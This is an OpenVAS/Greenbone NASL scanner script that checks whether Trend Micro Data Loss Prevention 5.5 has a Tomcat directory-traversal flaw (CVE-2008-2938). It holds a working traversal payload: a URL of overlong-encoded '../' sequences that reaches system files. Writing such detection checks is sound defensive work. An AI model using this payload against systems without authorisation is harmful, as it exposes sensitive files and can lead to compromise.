# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:trend_micro:data_loss_prevention";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103182");
  script_version("2024-07-23T05:05:30+0000");
  script_cve_id("CVE-2008-2938"); # nb: The bug on the product is caused by a vuln in Apache Tomcat, thus the related Tomcat CVE here.
  script_tag(name:"last_modification", value:"2024-07-23 05:05:30 +0000 (Tue, 23 Jul 2024)");
  script_tag(name:"creation_date", value:"2011-06-14 13:57:36 +0200 (Tue, 14 Jun 2011)");
  script_name("Trend Micro Data Loss Prevention 5.5 Directory Traversal Vulnerability");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_trend_micro_data_loss_prevention_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("trendmicro/datalossprevention/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48225");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17388/");
  script_xref(name:"URL", value:"http://us.trendmicro.com/us/products/enterprise/data-loss-prevention/index.html");

  script_tag(name:"summary", value:"Trend Micro Data Loss Prevention is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET requests and checks the response.");

  script_tag(name:"impact", value:"A remote attacker could exploit this vulnerability using directory-
  traversal strings (such as '../') to gain access to arbitrary files on the targeted system. This may
  result in the disclosure of sensitive information or lead to a complete compromise of the affected computer.");

  script_tag(name:"affected", value:"Trend Micro Data Loss Prevention 5.5 is vulnerable. Other versions may
  also be affected.");

  script_tag(name:"insight", value:"Trend Micro Data Loss Prevention is shipping a vulnerable Apache Tomcat
  version affected by a directory-traversal vulnerability registered with the CVE-2008-2938.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir  = get_app_location( cpe:CPE, port:port, service:"www" ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = string( dir, "//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/" + file );

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( url:url, port:port );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
